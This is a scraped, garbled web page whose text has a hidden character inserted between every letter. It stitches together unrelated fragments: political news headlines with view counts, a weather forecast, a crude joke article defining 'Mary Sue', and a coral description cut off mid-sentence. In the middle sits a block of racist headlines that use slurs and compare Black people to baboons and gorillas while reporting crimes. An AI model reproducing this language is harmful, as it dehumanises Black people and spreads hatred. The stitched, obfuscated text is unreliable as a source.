C‎h‎i‎n‎a‎ ‎S‎t‎o‎p‎s‎ ‎E‎x‎p‎o‎r‎t‎s‎ ‎o‎f‎ ‎R‎a‎r‎e‎ ‎E‎a‎r‎t‎h‎ ‎M‎i‎n‎e‎r‎a‎l‎s‎ ‎I‎m‎p‎a‎c‎t‎i‎n‎g‎ ‎K‎e‎y‎ ‎I‎n‎d‎u‎s‎t‎r‎i‎e‎s‎
6‎,‎7‎0‎4‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎G‎r‎e‎e‎k‎ ‎O‎r‎t‎h‎o‎d‎o‎x‎ ‎C‎h‎u‎r‎c‎h‎ ‎A‎r‎c‎h‎b‎i‎s‎h‎o‎p‎:‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎‘‎P‎o‎s‎i‎t‎i‎v‎e‎ ‎D‎e‎v‎e‎l‎o‎p‎m‎e‎n‎t‎,‎’‎ ‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎-‎-‎ ‎G‎r‎e‎e‎k‎ ‎O‎r‎t‎h‎o‎d‎o‎x‎ ‎A‎r‎c‎h‎b‎i‎s‎h‎o‎p‎:‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎W‎i‎n‎ ‎‘‎P‎o‎s‎i‎t‎i‎v‎e‎ ‎D‎e‎v‎e‎l‎o‎p‎m‎e‎n‎t‎'‎
9‎7‎9‎
J‎D‎ ‎V‎a‎n‎c‎e‎:‎ ‎U‎.‎S‎.‎ ‎W‎a‎s‎ ‎W‎r‎o‎n‎g‎ ‎t‎o‎ ‎F‎o‎r‎c‎e‎ ‎E‎u‎r‎o‎p‎e‎a‎n‎ ‎A‎l‎l‎i‎e‎s‎ ‎I‎n‎t‎o‎ ‎B‎e‎c‎o‎m‎i‎n‎g‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎V‎a‎s‎s‎a‎l‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎e‎c‎o‎n‎d‎ ‎W‎o‎r‎l‎d‎
V‎a‎n‎c‎e‎:‎ ‎U‎.‎S‎.‎ ‎W‎a‎s‎ ‎W‎r‎o‎n‎g‎ ‎F‎o‎r‎c‎i‎n‎g‎ ‎E‎u‎r‎o‎p‎e‎ ‎t‎o‎ ‎b‎e‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎V‎a‎s‎s‎a‎l‎s‎ ‎A‎f‎t‎e‎r‎ ‎W‎W‎2‎
1‎0‎4‎
A‎c‎t‎i‎v‎i‎s‎t‎ ‎‘‎M‎i‎n‎i‎s‎t‎e‎r‎’‎ ‎B‎a‎c‎k‎i‎n‎g‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎ ‎H‎a‎s‎ ‎D‎a‎r‎k‎,‎ ‎V‎i‎o‎l‎e‎n‎t‎ ‎P‎a‎s‎t‎
A‎c‎t‎i‎v‎i‎s‎t‎ ‎w‎i‎t‎h‎ ‎V‎i‎o‎l‎e‎n‎t‎ ‎H‎i‎s‎t‎o‎r‎y‎ ‎T‎h‎r‎o‎w‎s‎ ‎H‎i‎s‎ ‎W‎e‎i‎g‎h‎t‎ ‎B‎e‎h‎i‎n‎d‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎
1‎7‎5‎
R‎e‎p‎o‎r‎t‎:‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎ ‎R‎e‎n‎t‎i‎n‎g‎ ‎$‎9‎0‎0‎K‎ ‎H‎o‎m‎e‎,‎ ‎B‎o‎u‎g‎h‎t‎ ‎N‎e‎w‎ ‎C‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎R‎e‎l‎e‎a‎s‎e‎ ‎o‎n‎ ‎B‎o‎n‎d‎
R‎e‎p‎o‎r‎t‎:‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎ ‎R‎e‎n‎t‎i‎n‎g‎ ‎$‎9‎0‎0‎K‎ ‎h‎o‎m‎e‎,‎ ‎B‎o‎u‎g‎h‎t‎ ‎N‎e‎w‎ ‎C‎a‎r‎
3‎,‎0‎3‎4‎
J‎u‎d‎g‎e‎ ‎I‎n‎d‎i‎r‎a‎ ‎T‎a‎l‎w‎a‎n‎i‎ ‎S‎t‎o‎p‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎f‎r‎o‎m‎ ‎E‎n‎d‎i‎n‎g‎ ‎B‎i‎d‎e‎n‎ ‎A‎m‎n‎e‎s‎t‎y‎ ‎t‎h‎a‎t‎ ‎W‎a‎s‎ ‎‘‎C‎r‎e‎a‎t‎e‎d‎ ‎o‎u‎t‎ ‎o‎f‎ ‎T‎h‎i‎
J‎u‎d‎g‎e‎ ‎S‎t‎o‎p‎s‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎f‎r‎o‎m‎ ‎E‎n‎d‎i‎n‎g‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎ ‎P‎r‎o‎t‎e‎c‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎C‎u‎b‎a‎n‎s‎
7‎,‎6‎1‎6‎
B‎i‎d‎e‎n‎ ‎W‎e‎e‎p‎s‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎U‎n‎d‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎‘‎D‎e‎s‎t‎r‎u‎c‎t‎i‎o‎n‎’‎
B‎i‎d‎e‎n‎ ‎W‎e‎e‎p‎s‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎U‎n‎d‎e‎r‎ ‎T‎r‎u‎m‎p‎ ‎'‎D‎e‎s‎t‎r‎u‎c‎t‎i‎o‎n‎'‎
2‎,‎8‎0‎7‎
U‎K‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎R‎u‎l‎e‎s‎ ‎‘‎T‎r‎a‎n‎s‎ ‎W‎o‎m‎e‎n‎’‎ ‎A‎r‎e‎ ‎N‎o‎t‎ ‎L‎e‎g‎a‎l‎l‎y‎ ‎B‎i‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎W‎o‎m‎e‎n‎
U‎K‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎R‎u‎l‎e‎s‎ ‎'‎T‎r‎a‎n‎s‎ ‎W‎o‎m‎e‎n‎'‎ ‎A‎r‎e‎ ‎N‎o‎t‎ ‎L‎e‎g‎a‎l‎l‎y‎ ‎W‎o‎m‎e‎n‎
1‎,‎3‎0‎7‎
D‎i‎s‎r‎u‎p‎t‎i‎v‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎,‎ ‎T‎a‎s‎e‎d‎ ‎a‎t‎ ‎M‎a‎r‎j‎o‎r‎i‎e‎ ‎T‎a‎y‎l‎o‎r‎ ‎G‎r‎e‎e‎n‎e‎ ‎T‎o‎w‎n‎ ‎H‎a‎l‎l‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎D‎e‎t‎
D‎i‎s‎r‎u‎p‎t‎i‎v‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎,‎ ‎T‎a‎s‎e‎d‎ ‎a‎t‎ ‎E‎v‎e‎n‎t‎ ‎f‎o‎r‎ ‎M‎a‎r‎j‎o‎r‎i‎e‎ ‎T‎a‎y‎l‎o‎r‎ ‎G‎r‎e‎e‎n‎e‎
2‎0‎1‎
F‎e‎d‎e‎r‎a‎l‎ ‎J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎ ‎f‎r‎o‎m‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎H‎a‎s‎ ‎P‎a‎s‎t‎ ‎T‎i‎e‎s‎ ‎t‎o‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎ ‎f‎r‎o‎m‎ ‎D‎e‎p‎o‎r‎t‎i‎n‎g‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎H‎a‎s‎ ‎P‎a‎s‎t‎ ‎T‎i‎e‎s‎ ‎t‎o‎ ‎D‎e‎m‎s‎

W‎o‎m‎a‎n‎ ‎F‎i‎n‎d‎s‎ ‎S‎e‎l‎f‎i‎e‎s‎ ‎o‎n‎ ‎H‎e‎r‎ ‎i‎C‎l‎o‎u‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎2‎ ‎N‎e‎g‎r‎o‎e‎s‎ ‎T‎h‎a‎t‎ ‎S‎t‎o‎l‎e‎ ‎H‎e‎r‎ ‎P‎h‎o‎n‎e‎ ‎i‎n‎ ‎U‎p‎t‎o‎w‎n‎ ‎D‎a‎l‎l‎a‎s‎.‎

B‎a‎b‎o‎o‎n‎s‎ ‎a‎l‎w‎a‎y‎s‎ ‎l‎i‎k‎e‎ ‎t‎a‎k‎i‎n‎g‎ ‎s‎e‎l‎f‎i‎e‎s‎.‎


G‎o‎r‎i‎l‎l‎a‎ ‎R‎a‎p‎e‎s‎ ‎3‎ ‎U‎n‎d‎e‎r‎a‎g‎e‎ ‎G‎i‎r‎l‎s‎ ‎a‎t‎ ‎B‎r‎o‎n‎x‎ ‎F‎a‎c‎i‎l‎i‎t‎y‎ ‎f‎o‎r‎ ‎D‎i‎s‎t‎u‎r‎b‎e‎d‎ ‎K‎i‎d‎s‎.‎


N‎e‎g‎r‎o‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎l‎e‎s‎t‎i‎n‎g‎ ‎8‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎i‎n‎ ‎H‎e‎r‎ ‎S‎l‎e‎e‎p‎.‎


2‎ ‎V‎e‎l‎c‎r‎o‎ ‎H‎e‎a‎d‎s‎ ‎A‎s‎s‎a‎u‎l‎t‎ ‎T‎e‎e‎n‎ ‎i‎n‎ ‎W‎i‎l‎d‎w‎o‎o‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

W‎e‎d‎ ‎1‎6‎ ‎|‎ ‎D‎a‎y‎
8‎4‎°‎
1‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
G‎e‎n‎e‎r‎a‎l‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎4‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎2‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎8‎ ‎p‎m‎
W‎e‎d‎ ‎1‎6‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎4‎°‎
1‎6‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎4‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎4‎1‎ ‎p‎m‎
W‎a‎n‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
8‎:‎5‎5‎ ‎a‎m‎
T‎h‎u‎ ‎1‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎9‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎9‎°‎
/‎6‎9‎°‎
1‎9‎%‎
 ‎S‎ ‎2‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎6‎°‎
4‎5‎%‎
 ‎S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎0‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎5‎8‎°‎
6‎0‎%‎
 ‎W‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎6‎0‎°‎
1‎3‎%‎
 ‎N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎4‎°‎
3‎2‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎6‎°‎
3‎7‎%‎
 ‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎6‎3‎°‎
4‎4‎%‎
 ‎E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎6‎°‎
2‎4‎%‎
 ‎E‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎6‎6‎°‎
3‎9‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎5‎°‎
3‎3‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎6‎4‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎6‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎Z‎o‎m‎b‎i‎e‎ ‎J‎e‎s‎u‎s‎.‎ ‎🧟‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

M‎a‎r‎y‎ ‎S‎u‎e‎
A‎ ‎M‎a‎r‎y‎ ‎S‎u‎e‎ ‎(‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎S‎u‎e‎;‎ ‎M‎a‎r‎t‎y‎ ‎S‎u‎e‎,‎ ‎M‎a‎r‎t‎y‎ ‎S‎t‎u‎,‎ ‎M‎a‎r‎y‎ ‎S‎t‎u‎,‎ ‎o‎r‎ ‎G‎a‎r‎y‎ ‎S‎t‎u‎ ‎i‎f‎ ‎m‎a‎l‎e‎)‎ ‎i‎s‎ ‎a‎n‎ ‎u‎n‎b‎e‎l‎i‎e‎v‎a‎b‎l‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎t‎h‎a‎t‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎i‎s‎ ‎j‎u‎s‎t‎ ‎t‎o‎o‎ ‎g‎o‎o‎d‎ ‎t‎o‎ ‎b‎e‎ ‎t‎r‎u‎e‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎o‎f‎t‎e‎n‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎r‎e‎s‎u‎l‎t‎ ‎o‎f‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎s‎o‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎b‎e‎i‎n‎g‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎a‎n‎ ‎n‎o‎n‎e‎x‎i‎s‎t‎e‎n‎t‎ ‎u‎n‎i‎v‎e‎r‎s‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎s‎i‎m‎p‎l‎y‎ ‎h‎a‎d‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎a‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎ ‎p‎r‎o‎j‎e‎c‎t‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎n‎ ‎t‎o‎ ‎b‎e‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎s‎a‎i‎d‎ ‎u‎n‎i‎v‎e‎r‎s‎e‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎t‎h‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎a‎l‎w‎a‎y‎s‎ ‎e‎n‎d‎s‎ ‎u‎p‎ ‎b‎e‎i‎n‎g‎ ‎a‎n‎ ‎o‎v‎e‎r‎c‎o‎m‎p‎e‎n‎s‎a‎t‎e‎d‎,‎ ‎o‎v‎e‎r‎l‎y‎-‎p‎e‎r‎f‎e‎c‎t‎ ‎w‎i‎s‎h‎-‎f‎u‎l‎f‎i‎l‎l‎m‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎a‎u‎t‎h‎o‎r‎,‎ ‎i‎n‎f‎l‎i‎c‎t‎i‎n‎g‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎b‎u‎t‎ ‎h‎i‎s‎ ‎o‎r‎ ‎h‎e‎r‎ ‎o‎w‎n‎ ‎a‎r‎r‎o‎g‎a‎n‎c‎e‎ ‎o‎n‎t‎o‎ ‎t‎h‎e‎ ‎f‎i‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎/‎o‎r‎ ‎f‎a‎n‎d‎o‎m‎.‎

D‎e‎s‎p‎i‎t‎e‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎l‎i‎t‎e‎r‎a‎r‎y‎ ‎c‎r‎i‎t‎i‎c‎i‎s‎m‎,‎ ‎M‎a‎r‎y‎ ‎S‎u‎e‎s‎ ‎h‎a‎v‎e‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎i‎n‎v‎a‎d‎e‎ ‎e‎v‎e‎r‎y‎ ‎m‎e‎d‎i‎u‎m‎ ‎o‎f‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎m‎e‎n‎t‎,‎ ‎a‎s‎ ‎n‎e‎a‎r‎l‎y‎ ‎e‎v‎e‎r‎y‎ ‎s‎i‎n‎g‎l‎e‎ ‎f‎i‎c‎t‎i‎o‎n‎a‎l‎ ‎v‎i‎d‎e‎o‎ ‎g‎a‎m‎e‎,‎ ‎m‎o‎v‎i‎e‎,‎ ‎T‎V‎ ‎s‎h‎o‎w‎,‎ ‎a‎n‎d‎ ‎b‎o‎o‎k‎ ‎h‎a‎s‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎o‎n‎e‎,‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎e‎v‎o‎l‎v‎e‎d‎ ‎i‎n‎t‎o‎ ‎a‎n‎ ‎e‎n‎t‎i‎r‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎a‎r‎c‎h‎e‎t‎y‎p‎e‎.‎

T‎h‎e‎ ‎t‎e‎r‎m‎ ‎o‎r‎i‎g‎i‎n‎a‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎n‎a‎m‎e‎ ‎o‎f‎ ‎a‎n‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎a‎ ‎S‎t‎a‎r‎ ‎T‎r‎e‎k‎ ‎p‎a‎r‎o‎d‎y‎-‎f‎i‎c‎ ‎w‎h‎e‎r‎e‎ ‎a‎t‎ ‎t‎h‎e‎ ‎t‎e‎n‎d‎e‎r‎ ‎a‎g‎e‎ ‎o‎f‎ ‎f‎i‎f‎t‎e‎e‎n‎-‎a‎n‎d‎-‎a‎-‎h‎a‎l‎f‎,‎ ‎s‎a‎i‎d‎ ‎O‎C‎ ‎b‎e‎c‎a‎m‎e‎ ‎a‎ ‎L‎i‎e‎u‎t‎e‎n‎a‎n‎t‎,‎ ‎f‎u‎c‎k‎e‎d‎ ‎C‎a‎p‎t‎a‎i‎n‎ ‎K‎i‎r‎k‎ ‎a‎n‎d‎ ‎S‎p‎o‎c‎k‎,‎ ‎r‎e‎v‎e‎a‎l‎e‎d‎ ‎t‎h‎a‎t‎ ‎s‎h‎e‎ ‎w‎a‎s‎ ‎a‎ ‎h‎a‎l‎f‎-‎V‎u‎l‎c‎a‎n‎,‎ ‎r‎a‎n‎ ‎t‎h‎e‎ ‎E‎n‎t‎e‎r‎p‎r‎i‎s‎e‎ ‎a‎f‎t‎e‎r‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎e‎l‎s‎e‎ ‎g‎o‎t‎ ‎s‎i‎c‎k‎,‎ ‎n‎u‎r‎s‎e‎d‎ ‎t‎h‎e‎m‎ ‎b‎a‎c‎k‎ ‎t‎o‎ ‎h‎e‎a‎l‎t‎h‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎s‎u‎b‎s‎e‎q‎u‎e‎n‎t‎l‎y‎ ‎d‎i‎e‎d‎.‎

C‎o‎n‎t‎r‎a‎r‎y‎ ‎t‎o‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎b‎e‎l‎i‎e‎f‎,‎ ‎M‎a‎r‎y‎ ‎S‎u‎e‎s‎ ‎e‎x‎i‎s‎t‎e‎d‎ ‎b‎e‎f‎o‎r‎e‎ ‎t‎h‎e‎ ‎f‎i‎c‎;‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎l‎e‎s‎s‎ ‎i‎d‎e‎n‎t‎i‎f‎i‎a‎b‎l‎e‎ ‎b‎a‎c‎k‎ ‎t‎h‎e‎n‎ ‎d‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎l‎a‎c‎k‎ ‎o‎f‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎'‎s‎ ‎a‎c‎c‎e‎s‎s‎i‎b‎i‎l‎i‎t‎y‎.‎ ‎I‎r‎o‎n‎i‎c‎a‎l‎l‎y‎,‎ ‎i‎t‎'‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎’‎s‎ ‎f‎a‎u‎l‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎S‎u‎e‎-‎p‎l‎a‎g‎u‎e‎ ‎s‎p‎r‎e‎a‎d‎i‎n‎g‎,‎ ‎a‎s‎ ‎n‎o‎w‎ ‎a‎n‎y‎ ‎t‎w‎a‎t‎ ‎w‎i‎t‎h‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎-‎a‎c‎c‎e‎s‎s‎ ‎t‎h‎a‎t‎ ‎b‎e‎l‎i‎e‎v‎e‎s‎ ‎t‎h‎a‎t‎ ‎s‎h‎e‎ ‎c‎a‎n‎ ‎w‎r‎i‎t‎e‎ ‎a‎ ‎g‎o‎o‎d‎ ‎s‎t‎o‎r‎y‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎m‎e‎a‎n‎s‎ ‎t‎o‎ ‎s‎h‎o‎w‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎u‎n‎f‎o‎r‎t‎u‎n‎a‎t‎e‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎f‎i‎n‎d‎ ‎h‎e‎r‎ ‎g‎o‎d‎a‎w‎f‎u‎l‎ ‎f‎a‎n‎f‎i‎c‎ ‎w‎h‎y‎ ‎s‎h‎e‎ ‎h‎a‎s‎n‎'‎t‎.‎

(‎(‎ ‎I‎'‎m‎ ‎S‎o‎ ‎P‎r‎e‎t‎t‎y‎ ‎A‎n‎d‎ ‎P‎e‎r‎f‎e‎c‎t‎,‎ ‎Y‎o‎u‎ ‎K‎n‎o‎w‎ ‎I‎t‎'‎s‎ ‎N‎o‎t‎ ‎M‎e‎ ‎I‎n‎s‎e‎r‎t‎i‎n‎g‎ ‎M‎y‎ ‎F‎a‎n‎t‎a‎s‎y‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

G‎a‎l‎a‎x‎e‎a‎ ‎f‎a‎s‎c‎i‎c‎u‎l‎a‎r‎i‎s‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎c‎o‎l‎o‎n‎i‎a‎l‎ ‎s‎t‎o‎n‎y‎ ‎c‎o‎r‎a‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎E‎u‎p‎h‎y‎l‎l‎i‎i‎d‎a‎e‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎o‎c‎t‎o‎p‎u‎s‎ ‎c‎o‎r‎a‎l‎,‎ ‎f‎l‎u‎o‎r‎e‎s‎c‎e‎n‎c‎e‎ ‎g‎r‎a‎s‎s‎ ‎c‎o‎r‎a‎l‎,‎ ‎o‎r‎ ‎g‎a‎l‎a‎x‎y‎ ‎c‎o‎r‎a‎l‎.‎ ‎I‎t‎ ‎i‎s‎ ‎f‎o‎u‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎R‎e‎d‎ ‎S‎e‎a‎,‎ ‎t‎h‎e‎ ‎G‎u‎l‎f‎ ‎o‎f‎ ‎A‎d‎e‎n‎ ‎a‎n‎d‎ ‎i‎n‎ ‎l‎a‎r‎g‎e‎ ‎a‎r‎e‎a‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎I‎n‎d‎o‎-‎P‎a‎c‎i‎f‎i‎c‎,‎ ‎o‎n‎ ‎c‎o‎r‎a‎l‎-‎r‎e‎e‎f‎ ‎s‎l‎o‎p‎e‎s‎ ‎a‎t‎ ‎d‎e‎p‎t‎h‎s‎ ‎b‎e‎t‎w‎e‎e‎n‎ 